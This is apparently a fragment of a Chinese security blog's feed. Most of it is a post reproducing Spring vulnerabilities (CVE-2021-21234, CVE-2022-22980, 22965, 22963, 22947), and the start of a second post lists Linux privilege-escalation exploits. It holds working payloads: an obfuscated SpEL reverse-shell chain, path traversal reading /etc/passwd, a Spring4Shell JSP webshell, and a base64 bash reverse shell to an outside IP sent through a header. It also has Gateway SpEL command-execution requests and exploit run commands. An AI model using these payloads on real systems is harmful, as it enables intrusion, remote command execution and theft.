java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(85)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p></blockquote><p>反弹成功<br><img src="https://img-blog.csdnimg.cn/2a71fd763f72413d86ed417ce91832a0.png" alt="12"></p><h2 id="Spring-Boot-目录遍历-CVE-2021-21234"><a href="#Spring-Boot-目录遍历-CVE-2021-21234" class="headerlink" title="Spring Boot 目录遍历(CVE-2021-21234)"></a>Spring Boot 目录遍历(CVE-2021-21234)</h2><p>漏洞影响范围：spring boot actuator logview &lt; 0.2.13</p><h3 id="漏洞指纹-5"><a href="#漏洞指纹-5" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>首页为ok<br>or首页为Hellow Spring Boot<br><img src="https://img-blog.csdnimg.cn/direct/7a18b3c2c571452289656b6893ec2844.png" alt="132"></p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">#Windows&#123;&#123;BaseURL&#125;&#125;/manage/log/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../#Windows&#123;&#123;BaseURL&#125;&#125;/log/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../#Linux&#123;&#123;BaseURL&#125;&#125;/manage/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../#Linux&#123;&#123;BaseURL&#125;&#125;/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/direct/42739cd404f743eabf10ed0a61072a10.png" alt="123"></p><h2 id="Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980"><a href="#Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980" class="headerlink" title="Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)"></a>Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)</h2><p>影响版本：<br>Spring Data MongoDB &#x3D;&#x3D; 3.4.0<br>3.3.0 &lt;&#x3D; Spring Data MongoDB &lt;&#x3D; 3.3.4</p><h3 id="漏洞指纹-6"><a href="#漏洞指纹-6" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显指纹，如果存在spring+mongodb 的组合可以盲打一下</p><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote><p>name&#x3D;T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘ls’)</p></blockquote><h2 id="Spring-Framework-RCE-CVE-2022-22965"><a href="#Spring-Framework-RCE-CVE-2022-22965" class="headerlink" title="Spring Framework RCE(CVE-2022-22965)"></a>Spring Framework RCE(CVE-2022-22965)</h2><p>影响版本：<br>jdk9+ &amp; Spring及其衍生框架 &amp; 使用tomcat部署spring项目 &amp; 使用了POJO参数绑定 &amp; （Spring Framework 5.3.x - 5.3.18 ｜ Spring Framework 2.x - 5.2.20）</p><h3 id="漏洞指纹-7"><a href="#漏洞指纹-7" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显漏洞指纹，看到识别到 Spring+Java 的站可以盲打一下</p><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">class.module.classLoader.resources.context.parent.pipeline.first.pattern=构建文件的内容class.module.classLoader.resources.context.parent.pipeline.first.suffix=修改tomcat日志文件后缀class.module.classLoader.resources.context.parent.pipeline.first.directory=写入文件所在的网站根目录class.module.classLoader.resources.context.parent.pipeline.first.prefix=写入文件名称class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=文件日期格式（实际构造为空值即可）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以一个一个的GET发送，或者直接一次性POST发送，GET形如下面这种形式说明payload成功</p><h4 id="GET发送"><a href="#GET发送" class="headerlink" title="GET发送"></a>GET发送</h4><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;springclass.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jspclass.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOTclass.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;shellclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http://8.130.100.154:8080/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</code><br>最后访问shell.jsp<br><img src="https://img-blog.csdnimg.cn/direct/ab38e2952ee84292be53ac28959e6403.png" alt="132"></p><h4 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">url编码前的webshell：<span class="token operator">%</span><span class="token punctuation">&#123;</span>c2<span class="token punctuation">&#125;</span>i <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"t"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream <span class="token keyword">in</span> <span class="token operator">=</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span>c1<span class="token punctuation">&#125;</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> int a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token keyword">in</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span>suffix<span class="token punctuation">&#125;</span>iurl编码后的webshell：<span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc2<span class="token operator">%</span>7Di<span class="token operator">%</span><span class="token number">20</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token operator">%</span>22t<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc1<span class="token operator">%</span>7Di<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span>20int<span class="token operator">%</span>20a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3B<span class="token operator">%</span>20byte<span class="token operator">%</span>5B<span class="token operator">%</span>5D<span class="token operator">%</span>20b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20new<span class="token operator">%</span>20byte<span class="token operator">%</span>5B2048<span class="token operator">%</span>5D<span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token function">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span>3Din<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">%</span>3D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span><span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bsuffix<span class="token operator">%</span>7Di<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以现在只需要把shell.jsp的内容换成下面的</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc2<span class="token operator">%</span>7Di<span class="token operator">%</span><span class="token number">20</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token operator">%</span>22t<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc1<span class="token operator">%</span>7Di<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span>20int<span class="token operator">%</span>20a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3B<span class="token operator">%</span>20byte<span class="token operator">%</span>5B<span class="token operator">%</span>5D<span class="token operator">%</span>20b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20new<span class="token operator">%</span>20byte<span class="token operator">%</span>5B2048<span class="token operator">%</span>5D<span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token function">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span>3Din<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">%</span>3D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span><span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bsuffix<span class="token operator">%</span>7Di<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时在请求中需要加3个header</p><blockquote><p>suffix:%&gt;&#x2F;&#x2F;<br>c1:Runtime<br>c2:&lt;%</p></blockquote><p><img src="https://img-blog.csdnimg.cn/direct/69c6d3cf3a1842fea05860500ed9a43d.png" alt="123"></p><h2 id="Spring-Cloud-Function-RCE-CVE-2022-22963"><a href="#Spring-Cloud-Function-RCE-CVE-2022-22963" class="headerlink" title="Spring Cloud Function RCE(CVE-2022-22963)"></a>Spring Cloud Function RCE(CVE-2022-22963)</h2><p>影响版本：<br>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><p>&#x2F;functionRouter</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问&#x2F;functionRouter 使用POST发包，然后在header头里面放置payload<br> <img src="https://img-blog.csdnimg.cn/direct/0c8b5bbb98174599a460796ee4795154.png" alt="456"><br><code>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</code><br>然后服务器监听端口，之后发包，反弹成功<br><img src="https://img-blog.csdnimg.cn/direct/b7db3a870b714466855430367b09815d.png" alt="123"></p><h2 id="Spring-Cloud-Gateway-RCE-CVE-2022-22947"><a href="#Spring-Cloud-Gateway-RCE-CVE-2022-22947" class="headerlink" title="Spring Cloud Gateway RCE(CVE-2022-22947)"></a>Spring Cloud Gateway RCE(CVE-2022-22947)</h2><p>这个洞有两个前提</p><ul><li>management.endpoint.gateway.enabled: true</li><li>management.endpoints.web.exposure.include: gateway</li></ul><p>影响版本<br>pring Cloud Gateway 3.1.0 Spring Cloud Gateway 3.0.0 - 3.0.6 旧的不受支持的版本也受影响</p><h3 id="指纹-1"><a href="#指纹-1" class="headerlink" title="指纹"></a>指纹</h3><p>先介绍一下Spring cloud GateWay的actuator相关端点</p><ul><li><p>获取所有路由：Get请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code></p></li><li><p>添加路由：POST请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code>路由编号</p></li><li><p>删除路由：DELETE请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code>路由编号</p></li><li><p>获取指定路由：GET请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code>路由编号</p></li><li><p>刷新路由：POST请求：<code>http://localhost:xxxx/actuator/gateway/refresh</code></p></li></ul><p>其中，调用添加路由的端点时，可以向路由中加入filters，过滤器的值允许为spEL表达式，且会解析这个spEL表达式。可以通过构造spEL进行远程命令执行。构造的filters可以直接利用gateway自带的AddResponseHeader，将spEL的执行结果添加到响应头中，直接通过响应头进行查看</p><p>所以指纹就很清楚了–&gt; &#x2F;actutor&#x2F;gateway</p><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞利用过程为：添加路由–&gt;触发payload–&gt;查看结果 其本质为SpEL表达式注入，在添加路由时的value处插入表达式即可</p><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/actuator/gateway/routes/milu</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span><span class="token header-value">x.x.x.x:8080</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">329</span></span><span class="token application-json"><span class="token punctuation">&#123;</span>  <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"hacktest"</span><span class="token punctuation">,</span>  <span class="token property">"filters"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"AddResponseHeader"</span><span class="token punctuation">,</span>    <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Result"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\"id\"&#125;).getInputStream()))&#125;"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"uri"</span><span class="token operator">:</span> <span class="token string">"http://example.com"</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>alue”: “#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{&quot;id&quot;}).getInputStream()))}”</p><p>这里filters里的name可以任意修改为下面的内容</p><blockquote><p>#过滤器使用说明<br><a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory">https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory</a></p></blockquote><pre class="line-numbers language-text" data-language="text"><code class="language-text">AddRequestHeaderMapRequestHeaderAddRequestParameterAddResponseHeaderModifyRequestBodyDedupeResponseHeaderModifyResponseBodyCacheRequestBodyPrefixPathPreserveHostHeaderRedirectToRemoveRequestHeaderRemoveRequestParameterRemoveResponseHeaderRewritePathRetrySetPathSecureHeadersSetRequestHeaderSetRequestHostHeaderRewriteResponseHeaderRewriteLocationResponseHeaderSetStatusSaveSessionStripPrefixRequestHeaderToRequestUriRequestSizeRequestHeaderSize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="触发payload"><a href="#触发payload" class="headerlink" title="触发payload"></a>触发payload</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /actuator/gateway/refresh HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h4><p>访问 –&gt; &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;milu<br><img src="https://img-blog.csdnimg.cn/direct/67419cadda4d4a619e3e40003754c522.png" alt="123"></p><h4 id="删除路由"><a href="#删除路由" class="headerlink" title="删除路由"></a>删除路由</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">DELETE /actuator/gateway/routes/milu HTTP/1.1Host: 192.168.32.130:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="刷新路由"><a href="#刷新路由" class="headerlink" title="刷新路由"></a>刷新路由</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.32.130:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：<a href="https://mp.weixin.qq.com/s/ZwTjUv7jemN7BWx72R9B-A">从0认识+识别+掌握spring全漏洞(1.8w字超详细看完拿捏spring)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://3143047748.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="复现" scheme="http://3143047748.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>117种提权手法</title>
    <link href="http://3143047748.github.io/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/"/>
    <id>http://3143047748.github.io/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/</id>
    <published>2023-11-17T12:44:12.000Z</published>
    <updated>2023-11-17T12:48:48.559Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是网络安全中的权限提升？"><a href="#什么是网络安全中的权限提升？" class="headerlink" title="什么是网络安全中的权限提升？"></a>什么是网络安全中的权限提升？</h1><p>在网络安全领域，了解威胁至关重要，而最关键的威胁之一就是特权升级的概念。从本质上讲，权限升级是指攻击者获得通常为高级用户保留的系统权限或功能的情况。</p><p>主要有两种类型：垂直升级和水平升级。在垂直升级中，具有较低级别权限的攻击者将其权限提升到较高级别用户（通常是管理员）的权限。这使得他们能够访问受限区域、修改系统配置，甚至部署恶意软件。另一方面，横向升级涉及访问属于对等用户的资源或功能，并利用类似特权帐户的权限。</p><p>特权升级的危险是显而易见的。通过提升权限，攻击者可以绕过网络安全措施，从而损害数据完整性、机密性和系统可用性。对于组织而言，这可能会导致数据泄露、系统停机以及潜在的法律和声誉后果。识别权限升级的迹象并部署预防性网络安全措施对于保护数字资产并确保只有授权人员才能访问关键系统功能至关重要。</p><p>鉴于网络安全不断发展的形势，对特权升级等威胁保持警惕至关重要。它强调了不断更新安全协议、监控系统活动以及确保正确分配和定期审核用户角色和权限的重要性。这样做，组织可以减轻与未经授权的访问相关的风险，并保持对潜在网络对手的强大防御。</p><p>现在我们已经熟悉了这个概念，我们将继续研究这个提权概念的117种方法：</p><h1 id="117种提权手法"><a href="#117种提权手法" class="headerlink" title="117种提权手法"></a>117种提权手法</h1><h3 id="DirtyC0w"><a href="#DirtyC0w" class="headerlink" title="DirtyC0w"></a>DirtyC0w</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: <code>gcc -pthread c0w.c -o c0w; ./c0w; passwd; id</code></p><p>批注：<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><h3 id="CVE-2016-1531"><a href="#CVE-2016-1531" class="headerlink" title="CVE-2016-1531"></a>CVE-2016-1531</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: <code>CVE-2016-1531.sh;id</code></p><p>批注：<a href="https://github.com/crypticdante/CVE-2016-1531">https://github.com/crypticdante/CVE-2016-1531</a></p><h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  0&#x2F;1 Exploit</p><p>方法:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;secnigma&#x2F;CVE-2021-3560-Polkit-Privilege-Esclation.&#x2F;2. poc.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li><code>./traitor-amd64 –exploit kernel:CVE-2022-0847</code></li><li><code>Whoami;id</code></li></ol><p>批注：<a href="https://github.com/liamg/traitor/releases/tag/v0.0.14">https://github.com/liamg/traitor/releases/tag/v0.0.14</a></p><h3 id="PwnKit"><a href="#PwnKit" class="headerlink" title="PwnKit"></a>PwnKit</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li><code>./cve-2021-4034</code></li><li><code>Whoami;id</code></li></ol><p>批注：<a 